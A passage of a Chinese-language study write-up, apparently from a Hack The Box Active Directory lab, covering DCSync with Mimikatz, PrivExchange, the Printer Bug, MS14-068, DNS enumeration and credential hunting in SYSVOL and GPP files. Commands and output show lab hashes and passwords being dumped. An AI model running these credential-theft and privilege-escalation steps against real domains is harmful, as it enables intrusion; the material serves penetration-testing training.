class="number">3</span>/<span class="number">30</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">53</span>:<span class="number">09</span> (local)</span><br><span class="line">        <span class="keyword">End</span> Time:   <span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">1</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Renew Time: <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Session Key <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Cache Flags: <span class="number">0</span></span><br><span class="line">        Kdc Called: ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br></pre></td></tr></table></figure>

<h4 id="Mimikatz-performs-DCSync"><a href="#Mimikatz-performs-DCSync" class="headerlink" title="Mimikatz performs DCSync"></a>Mimikatz performs DCSync</h4><p>同样，由于域控制器在域中具有复制权限，可以使用传递票证从 Windows 攻击主机使用 Mimikatz 执行 DCSync 攻击。在这里，获取 KRBTGT 帐户的 NT hash，该哈希可用于创建黄金票证并建立持久性。可以使用 DCSync 获取任何特权用户的 NT hash，然后进入评估的下一阶段。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">cd</span> .\mimikatz\x64\</span><br><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /user:inlanefreight\krbtgt</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;inlanefreight\krbtgt&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00000202</span> ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">10</span>/<span class="number">27</span>/<span class="number">2021</span> <span class="number">8</span>:<span class="number">14</span>:<span class="number">34</span> AM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-502</span></span><br><span class="line">Object Relative ID   : <span class="number">502</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">16</span>e26ba33e455a8c338142af8d89ffbc</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">16</span>e26ba33e455a8c338142af8d89ffbc</span><br><span class="line">    lm  - <span class="number">0</span>: <span class="number">4562458</span>c201a97fa19365ce901513c21</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Miscellaneous-Misconfigurations"><a href="#Miscellaneous-Misconfigurations" class="headerlink" title="Miscellaneous Misconfigurations"></a>Miscellaneous Misconfigurations</h1><p>在评估过程中，可能会遇到许多其他攻击和有趣的错误配置。对 AD 的来龙去脉有广泛的了解将有助于跳出固有的思维模式，发现其他人可能忽略的问题。</p>
<h2 id="Exchange-Related-Group-Membership"><a href="#Exchange-Related-Group-Membership" class="headerlink" title="Exchange Related Group Membership"></a>Exchange Related Group Membership</h2><p>在 AD 环境中默认安装 Microsoft Exchange（没有拆分管理模型）会打开许多攻击途径，因为 Exchange 通常会在域内被授予相当大的权限（通过用户、组和 ACL）。该组<code>Exchange Windows Permissions</code>未列为受保护组，但成员被授予将 DACL 写入域对象的权限。可以利用这一点为用户提供 DCSync 权限。攻击者可以利用 DACL 配置错误（可能）或利用属于 Account Operators 组的受感染帐户将帐户添加到此组。通常会发现用户帐户甚至计算机是此组的成员。远程办公室的高级用户和支持人员通常会被添加到此组，从而允许他们重置密码。此<a target="_blank" rel="noopener" href="https://github.com/gdedrouas/Exchange-AD-Privesc">GitHub 存储库</a>详细介绍了利用 Exchange 在 AD 环境中提升权限的几种技术。</p>
<p>Exchange 组<code>Organization Management</code>是另一个非常强大的组（实际上是 Exchange 的“域管理员”），可以访问所有域用户的邮箱。系统管理员成为此组的成员并不罕见。此组还对名为<code>Microsoft Exchange Security Groups</code>的 OU 具有完全控制权，其中包含组<code>Exchange Windows Permissions</code>。</p>
<p>查看管理员权限</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729062754599.png" alt="图像"></p>
<p>如果可以入侵 Exchange 服务器，这通常会导致域管理员权限。此外，从 Exchange 服务器转储内存中的凭据将产生 10 个甚至 100 个明文凭据或 NTLM 哈希。这通常是由于用户登录 Outlook Web Access (OWA) 并且 Exchange 在成功登录后将其凭据缓存在内存中。</p>
<h2 id="PrivExchange"><a href="#PrivExchange" class="headerlink" title="PrivExchange"></a>PrivExchange</h2><p>此次<code>PrivExchange</code>攻击源于 Exchange Server<code>PushSubscription</code>功能中的一个缺陷，该缺陷允许任何拥有邮箱的域用户强制 Exchange 服务器通过 HTTP 向客户端提供的任何主机进行身份验证。</p>
<p>Exchange 服务以 SYSTEM 身份运行，默认情况下具有过高权限（即，在 2019 年累积更新之前的域上具有 WriteDacl 权限）。可以利用此漏洞中继到 LDAP 并转储域 NTDS 数据库。如果无法中继到 LDAP，则可以利用此漏洞中继并验证域内的其他主机。此攻击将直接带您使用任何经过身份验证的域用户帐户进入域管理员。</p>
<h2 id="Printer-Bug"><a href="#Printer-Bug" class="headerlink" title="Printer Bug"></a>Printer Bug</h2><p>打印机漏洞是 MS-RPRN 协议（打印系统远程协议）中的一个漏洞。该协议定义了客户端和打印服务器之间打印作业处理和打印系统管理的通信。要利用此漏洞，任何域用户都可以使用该<code>RpcOpenPrinter</code>方法连接到 spool 的命名管道并使用该<code>RpcRemoteFindFirstPrinterChangeNotificationEx</code>方法，并强制服务器通过 SMB 向客户端提供的任何主机进行身份验证。</p>
<p>后台处理程序服务以 SYSTEM 身份运行，并默认安装在运行桌面体验的 Windows 服务器中。此攻击可利用来中继到 LDAP 并授予攻击者帐户 DCSync 权限，以从 AD 中检索所有密码哈希。</p>
<p>该攻击还可用于中继 LDAP 身份验证，并将受害者的基于资源的约束委派 (RBCD) 权限授予控制下的计算机帐户，从而使攻击者有权以受害者计算机上的任何用户身份进行身份验证。可以利用此攻击来破坏合作伙伴域&#x2F;林中的域控制器，前提是您已经拥有对第一个林&#x2F;域中的域控制器的管理访问权限，并且信任允许 TGT 委派（默认情况下不再如此）。</p>
<p>可以使用<a target="_blank" rel="noopener" href="http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment">Security-Assessment</a>工具中的<code>Get-SpoolStatus</code>模块（可在生成的目标上找到）或<a target="_blank" rel="noopener" href="https://github.com/NotMedic/NetNTLMtoSilverTicket">NetNTLMtoSilverTicket</a>工具等工具来检查易受<a target="_blank" rel="noopener" href="https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability">MS-PRN 打印机漏洞攻击</a>的机器。此漏洞可用于破坏启用了无约束委派的另一个林中的主机，例如域控制器。一旦破坏了一个林，它就可以帮助跨林信任进行攻击。</p>
<h3 id="enum-8"><a href="#enum-8" class="headerlink" title="enum"></a>enum</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\SecurityAssessment.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-SpoolStatus</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">ComputerName                        Status</span><br><span class="line"><span class="literal">------------</span>                        <span class="literal">------</span></span><br><span class="line">ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL   True</span><br></pre></td></tr></table></figure>

<h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>这是 Kerberos 协议中的一个缺陷，该缺陷可与标准域用户凭据一起利用，将权限提升至域管理员。Kerberos 票证包含有关用户的信息，包括特权属性证书 (PAC) 中的帐户名称、ID 和组成员身份。PAC 由 KDC 使用密钥签名，以验证 PAC 在创建后未被篡改。</p>
<p>该漏洞允许伪造的 PAC 被 KDC 视为合法。可以利用此漏洞创建假 PAC，将用户显示为域管理员或其他特权组的成员。可以使用<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek">Python Kerberos Exploitation Kit (PyKEK)</a>或 Impacket 工具包等工具来利用该漏洞。针对此攻击的唯一防御措施是修补。Hack The Box 平台上的机器<a target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/98">Mantis</a>展示了此漏洞。</p>
<h2 id="Sniffing-LDAP-Credentials"><a href="#Sniffing-LDAP-Credentials" class="headerlink" title="Sniffing LDAP Credentials"></a>Sniffing LDAP Credentials</h2><p>许多应用程序和打印机将 LDAP 凭据存储在其 Web 管理控制台中，以连接到域。这些控制台通常留有弱密码或默认密码。有时，这些凭据可以以明文形式查看。其他时候，应用程序有一个<code>test connection</code>功能，可以通过将 LDAP IP 地址更改为攻击主机的 IP 地址并<code>netcat</code>在 LDAP 端口 389 上设置侦听器来收集凭据。当设备尝试测试 LDAP 连接时，它会将凭据发送到机器，通常以明文形式。用于 LDAP 连接的帐户通常具有特权，但如果不是，这可以作为域中的初始立足点。其他时候，需要完整的 LDAP 服务器才能完成此攻击，如<a target="_blank" rel="noopener" href="https://grimhacker.com/2018/03/09/just-a-printer/">本文所述</a>。</p>
<h2 id="Enumerating-DNS-Records"><a href="#Enumerating-DNS-Records" class="headerlink" title="Enumerating DNS Records"></a>Enumerating DNS Records</h2><p>可以使用<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/adidnsdump">adidnsdump</a>等工具，通过有效的域用户帐户枚举域中的所有 DNS 记录。如果使用诸如<code>BloodHound</code>之类的工具枚举时返回给主机命名约定类似于<code>SRV01934.INLANEFREIGHT.LOCAL</code>，这将特别有用。如果所有服务器和工作站都有一个非描述性名称，就很难知道到底要攻击什么。如果可以访问 AD 中的 DNS 条目，可能会发现指向同一服务器的有趣 DNS 记录，例如<code>JENKINS.INLANEFREIGHT.LOCAL</code>，可以使用它来更好地计划攻击。</p>
<p>该工具之所以有效，是因为默认情况下，所有用户都可以在 AD 环境中列出 DNS 区域的子对象。默认情况下，使用 LDAP 查询 DNS 记录不会返回所有结果。因此，通过使用<code>adidnsdump</code>工具，可以解析区域中的所有记录，并可能找到对参与有用的东西。有关此工具和技术的背景和更深入的解释可以在这篇<a target="_blank" rel="noopener" href="https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/">文章</a>中找到。</p>
<p>第一次运行该工具时，可以看到一些记录是空白的，即<code>?,LOGISTICS,?</code>。</p>
<h3 id="adidnsdump"><a href="#adidnsdump" class="headerlink" title="adidnsdump"></a>adidnsdump</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 </span><br><span class="line"></span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[-] Querying zone for records</span><br><span class="line">[+] Found 27 records</span><br></pre></td></tr></table></figure>

<p>records.csv</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ head records.csv </span><br><span class="line"></span><br><span class="line">type,name,value</span><br><span class="line">?,LOGISTICS,?</span><br><span class="line">AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691</span><br><span class="line">AAAA,ForestDnsZones,dead:beef::231</span><br><span class="line">A,ForestDnsZones,10.129.202.29</span><br><span class="line">A,ForestDnsZones,172.16.5.240</span><br><span class="line">A,ForestDnsZones,172.16.5.5</span><br><span class="line">AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691</span><br><span class="line">AAAA,DomainDnsZones,dead:beef::231</span><br><span class="line">A,DomainDnsZones,10.129.202.29</span><br></pre></td></tr></table></figure>

<p>如果再次使用<code>-r</code>参数运行，该工具将尝试通过执行<code>A</code>查询来解析未知记录。现在可以看到LOGISTICS 的 IP 地址为<code>172.16.5.240</code>。虽然这是一个小例子，但值得在更大的环境中运行此工具。可能会发现“隐藏”的记录，从而发现有趣的主机。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r</span><br><span class="line"></span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[-] Querying zone for records</span><br><span class="line">[+] Found 27 records</span><br></pre></td></tr></table></figure>

<p>records.csv</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ head records.csv </span><br><span class="line"></span><br><span class="line">type,name,value</span><br><span class="line">A,LOGISTICS,172.16.5.240</span><br><span class="line">AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691</span><br><span class="line">AAAA,ForestDnsZones,dead:beef::231</span><br><span class="line">A,ForestDnsZones,10.129.202.29</span><br><span class="line">A,ForestDnsZones,172.16.5.240</span><br><span class="line">A,ForestDnsZones,172.16.5.5</span><br><span class="line">AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691</span><br><span class="line">AAAA,DomainDnsZones,dead:beef::231</span><br><span class="line">A,DomainDnsZones,10.129.202.29</span><br></pre></td></tr></table></figure>

<h2 id="Password-in-Description-Field"><a href="#Password-in-Description-Field" class="headerlink" title="Password in Description Field"></a>Password in Description Field</h2><p>敏感信息（例如帐户密码）有时会出现在用户帐户<code>Description</code>或<code>Notes</code>字段中，可以使用 PowerView 快速枚举。对于大型域，将这些数据导出到 CSV 文件以供离线查看会很有帮助。</p>
<p>使用 Get-Domain User 在描述字段中查找密码</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> * | <span class="built_in">Select-Object</span> samaccountname,description |<span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.Description <span class="operator">-ne</span> <span class="variable">$null</span>&#125;</span><br><span class="line"></span><br><span class="line">samaccountname description</span><br><span class="line"><span class="literal">--------------</span> <span class="literal">-----------</span></span><br><span class="line">administrator  Built<span class="operator">-in</span> account <span class="keyword">for</span> administering the computer/domain</span><br><span class="line">guest          Built<span class="operator">-in</span> account <span class="keyword">for</span> guest access to the computer/domain</span><br><span class="line">krbtgt         Key Distribution Center Service Account</span><br><span class="line">ldap.agent     *** <span class="keyword">DO</span> NOT CHANGE ***  <span class="number">3</span>/<span class="number">12</span>/<span class="number">2012</span>: Sunsh1ne4All!</span><br></pre></td></tr></table></figure>

<h2 id="PASSWD-NOTREQD-Field"><a href="#PASSWD-NOTREQD-Field" class="headerlink" title="PASSWD_NOTREQD Field"></a>PASSWD_NOTREQD Field</h2><p>可能会遇到在 userAccountControl 属性中设置了<a target="_blank" rel="noopener" href="https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD">passwd_notreqd</a>字段的域帐户。如果设置了该字段，则用户不受当前密码策略长度的限制，这意味着他们可以使用较短的密码或根本不使用密码（如果域中允许使用空密码）。密码可能被故意设置为空白（有时管理员不想在非工作时间被叫去重置用户密码）或在通过命令行更改密码时意外按下 Enter 键。仅仅因为在帐户上设置了此标志，并不意味着没有设置密码，只是可能不需要密码。在用户帐户上设置此标志的原因有很多，其中一个原因是供应商产品在安装时在某些帐户上设置了此标志，并且在安装后从未删除该标志。值得枚举设置了此标志的帐户并测试每个帐户以查看是否不需要密码（我在评估中见过几次这种情况）。此外，如果评估的目标是尽可能全面，请将其包含在客户报告中。</p>
<p>检查PASSWD_NOTREQD设置</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-UACFilter</span> PASSWD_NOTREQD | <span class="built_in">Select-Object</span> samaccountname,useraccountcontrol</span><br><span class="line"></span><br><span class="line">samaccountname                                                         useraccountcontrol</span><br><span class="line"><span class="literal">--------------</span>                                                         <span class="literal">------------------</span></span><br><span class="line">guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD</span><br><span class="line">mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD</span><br><span class="line">ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD</span><br><span class="line"><span class="variable">$725000</span><span class="literal">-9jb50uejje9f</span>                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT</span><br><span class="line">nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT</span><br></pre></td></tr></table></figure>

<h2 id="Credentials-in-SMB-Shares-and-SYSVOL-Scripts"><a href="#Credentials-in-SMB-Shares-and-SYSVOL-Scripts" class="headerlink" title="Credentials in SMB Shares and SYSVOL Scripts"></a>Credentials in SMB Shares and SYSVOL Scripts</h2><p>SYSVOL 共享可能是一个数据宝库，尤其是在大型组织中。可能会在脚本目录中找到许多不同的批处理、VBScript 和 PowerShell 脚本，这些脚本可供域中所有经过身份验证的用户读取。值得深入研究此目录以寻找存储在脚本中的密码。有时会发现包含已禁用帐户或旧密码的非常古老的脚本，但有时会发现金矿，所以应该始终深入研究此目录。在这里，可以看到一个名为的有趣脚本<code>reset_local_admin_pass.vbs</code>。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">ls</span> \\academy<span class="literal">-ea-dc01</span>\SYSVOL\INLANEFREIGHT.LOCAL\scripts</span><br><span class="line"></span><br><span class="line">    Directory: \\academy<span class="literal">-ea-dc01</span>\SYSVOL\INLANEFREIGHT.LOCAL\scripts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                 </span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                 </span><br><span class="line"><span class="literal">-a----</span>       <span class="number">11</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">10</span>:<span class="number">44</span> AM            <span class="number">174</span> daily<span class="literal">-runs</span>.zip                                                       </span><br><span class="line"><span class="literal">-a----</span>        <span class="number">2</span>/<span class="number">28</span>/<span class="number">2022</span>   <span class="number">9</span>:<span class="number">11</span> PM            <span class="number">203</span> <span class="built_in">disable-nbtns</span>.ps1                                                    </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">3</span>/<span class="number">7</span>/<span class="number">2022</span>   <span class="number">9</span>:<span class="number">41</span> AM         <span class="number">144138</span> Logon Banner.htm                                                     </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">3</span>/<span class="number">8</span>/<span class="number">2022</span>   <span class="number">2</span>:<span class="number">56</span> PM            <span class="number">979</span> reset_local_admin_pass.vbs  </span><br></pre></td></tr></table></figure>

<p>仔细查看该脚本，发现它包含 Windows 主机上内置本地管理员的密码。在这种情况下，值得检查一下域中的任何主机上是否仍设置了此密码。可以使用 <code>CrackMapExec</code> 和<code>--local-auth</code> 标志来执行此操作，如本模块的内部<code>Internal Password Spraying - from Linux</code>。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">cat</span> \\academy<span class="literal">-ea-dc01</span>\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs</span><br><span class="line"></span><br><span class="line">On Error Resume Next</span><br><span class="line">strComputer = <span class="string">&quot;.&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">Set</span> oShell = CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>) </span><br><span class="line">sUser = <span class="string">&quot;Administrator&quot;</span></span><br><span class="line">sPwd = <span class="string">&quot;!ILFREIGHT_L0cALADmin!&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">Set</span> Arg = WScript.Arguments</span><br><span class="line"><span class="keyword">If</span>  Arg.Count &gt; <span class="number">0</span> Then</span><br><span class="line">sPwd = Arg(<span class="number">0</span>) <span class="string">&#x27;Pass the password as parameter to the script</span></span><br><span class="line"><span class="string">End if</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&#x27;</span>Get the administrator name</span><br><span class="line"><span class="built_in">Set</span> objWMIService = GetObject(<span class="string">&quot;winmgmts:\\&quot;</span> &amp; strComputer &amp; <span class="string">&quot;\root\cimv2&quot;</span>)</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Group-Policy-Preferences-GPP-Passwords"><a href="#Group-Policy-Preferences-GPP-Passwords" class="headerlink" title="Group Policy Preferences (GPP) Passwords"></a>Group Policy Preferences (GPP) Passwords</h2><p>创建新的 GPP 时，会在 SYSVOL 共享中创建一个 .xml 文件，该文件也会在组策略适用的端点上本地缓存。这些文件可以包括用于以下操作的文件：</p>
<ul>
<li>映射驱动器 (drives.xml)</li>
<li>创建本地用户</li>
<li>创建打印机配置文件（printers.xml）</li>
<li>创建和更新服务（services.xml）</li>
<li>创建计划任务（scheduledtasks.xml）</li>
<li>更改本地管理员密码。</li>
</ul>
<p>这些文件可以包含一系列配置数据和定义的密码。<code>cpassword</code>属性值是 AES-256 位加密的，但 Microsoft<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">在 MSDN 上发布了 AES 私钥</a>，可用于解密密码。任何域用户都可以读取这些文件，因为它们存储在 SYSVOL 共享上，并且域中所有经过身份验证的用户默认都具有对此域控制器共享的读取权限。</p>
<p><a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30">2014 年MS14-025 GPP 中的漏洞可能允许特权提升</a>，已修复此问题，以防止管理员使用 GPP 设置密码。此修补程序不会从 SYSVOL 中删除带有密码的现有 Groups.xml 文件。如果您删除 GPP 策略而不是将其与 OU 取消链接，则本地计算机上的缓存副本将保留。</p>
<p>XML 如下所示：</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729257504062.png" alt="图像"></p>
<p>如果您更手动地检索 cpassword 值，<code>gpp-decrypt</code>则可以使用该实用程序按如下方式解密密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</span><br><span class="line"></span><br><span class="line">Password1</span><br></pre></td></tr></table></figure>

<p>可以通过搜索或手动浏览 SYSVOL 共享或使用<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword.ps1</a>、GPP Metasploit Post Module 和其他 Python&#x2F;Ruby 脚本等工具来定位 GPP 密码，这些脚本将定位 GPP 并返回解密的 cpassword 值。CrackMapExec 还有两个用于定位和检索 GPP 密码的模块。在交战期间要考虑的一个快速提示：通常，GPP 密码是为旧帐户定义的，因此您可以检索和解密已锁定或已删除帐户的密码。但是，值得尝试使用此密码在内部进行密码喷洒（特别是如果它是唯一的）。密码重用很普遍，GPP 密码与密码喷洒相结合可能会导致进一步的访问。</p>
<h3 id="Locating-Retrieving-GPP-Passwords-CrackMapExec"><a href="#Locating-Retrieving-GPP-Passwords-CrackMapExec" class="headerlink" title="Locating &amp; Retrieving GPP Passwords - CrackMapExec"></a>Locating &amp; Retrieving GPP Passwords - CrackMapExec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb -L | grep gpp</span><br><span class="line"></span><br><span class="line">[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.</span><br><span class="line">[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.</span><br></pre></td></tr></table></figure>

<p>当通过组策略配置自动登录时，还可以在 Registry.xml 等文件中找到密码。这可能出于多种原因而设置，以使计算机在启动时自动登录。如果这是通过组策略设置的，而不是在主机本地设置的，那么域中的任何人都可以检索为此目的创建的 Registry.xml 文件中存储的凭据。这是一个与 GPP 密码不同的问题，因为 Microsoft 尚未采取任何措施阻止以明文形式将这些凭据存储在 SYSVOL 上，因此域中任何经过身份验证的用户都可以读取这些凭据。可以使用带有<a target="_blank" rel="noopener" href="https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin">gpp_autologin</a>模块的 CrackMapExec 或使用PowerSploit 中包含的<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1">Get-GPPAutologon.ps1脚本来寻找它。</a></p>
